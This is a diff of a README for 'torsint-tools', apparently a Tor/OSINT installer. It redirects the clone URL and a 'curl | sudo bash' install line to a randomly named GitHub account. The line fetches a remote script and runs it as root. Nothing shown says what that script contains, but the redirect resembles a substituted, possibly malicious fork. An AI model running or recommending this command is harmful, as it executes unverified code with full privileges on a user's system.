@@ -23,7 +23,7 @@ This script installs the following tools:
 ## ⚙️ Installation
 
 ```bash
-git clone https://github.com/dead-cr0w/torsint-tools.git
+git clone https://github.com/ehA33ADxsk9w/torsint-tools.git
 cd torsint-tools.git
 chmod +x install_torsint.sh
 ./install_torsint.sh
@@ -31,5 +31,5 @@ chmod +x install_torsint.sh
 
 Or use curl:
 ```bash
-curl -fsSL https://raw.githubusercontent.com/torsint-tools/main/torsint.sh | sudo bash
+curl -fsSL https://raw.githubusercontent.com/ehA33ADxsk9w/torsint-tools/refs/heads/main/install_torsint.sh | sudo bash
 ```
